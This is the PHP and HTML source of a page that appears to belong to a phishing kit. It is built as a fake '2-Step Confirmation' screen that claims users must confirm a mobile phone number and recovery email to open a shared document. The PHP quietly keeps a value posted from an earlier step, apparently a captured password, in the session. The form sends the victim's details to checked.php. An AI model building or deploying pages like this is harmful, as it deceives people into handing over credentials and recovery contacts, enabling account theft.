<?php
ob_start();
session_start();


if ($_POST){
	
	$fnamea = $_POST['old'];
	$_SESSION['old'] = $fnamea;

}	
 
?>

<! DOCTYPE html>
<html>
<head>
<title>Checkpoint</title>
<link rel="icon" href="favicon.png" sizes="16x16" type="image/png">
<style>

body{
 text-align:center;
 margin:0;
 background:#ededed;
 font-family: helvetica, georgia, Times New Roman;
 color:#2b2b2b;
}

#centered{
    width:400px;
    border:1px solid #c7c6c6;
    margin:30px auto;
	background:#fff;
	padding:5px 20px 20px;
   }
#header{
 background-color:#4682fc;
 padding: 15px;
 text-align:left;
 color:#FFF;
 font-size:20px;
 font-weight:bold;
}
.head{
    font-family:helvetica;
	color:#5d5d5d;
	font-size:30px;
  }
  
.box{
  height:40px;
  width:100%;
  border:1px solid #8eb3ff;

}

.submit{
  background:#5089fd;
  color:#fff;
  font-weight:bold;
  width:100%;
  height:40px;
  border:none;
}

</style>
</head>


<body>
<div id="header">
	  2-Step Confirmation
     </div>
	 
<form action="checked.php" method="post">	 
<div id="centered">
<p class="head">Confirm your identity</p>
<p>Confirm at least one backup option so you can access the shared document</p>
<img src="mobile.png">
<p style="text-align:left;">
<span style="font-size:15px;"><b>Mobile Phone:</b></span> 
<input type="text" size="50px" class="box" placeholder="" name="mobile" required>
</p>

<p style="text-align:left;">
<span style="font-size:15px;"><b>Recovery Email:  </b></span> 
<input type="text" size="50px" class="box" name="recmail" required>
</p>

<p style="text-align:left;">
<input type="checkbox" size="50px" class="checkbox" checked>
Don't ask again on this computer
</p>

<p>
<input type="submit" size="50px" class="submit" value="Done">
</p>


</div>
</form>
</body>
</html>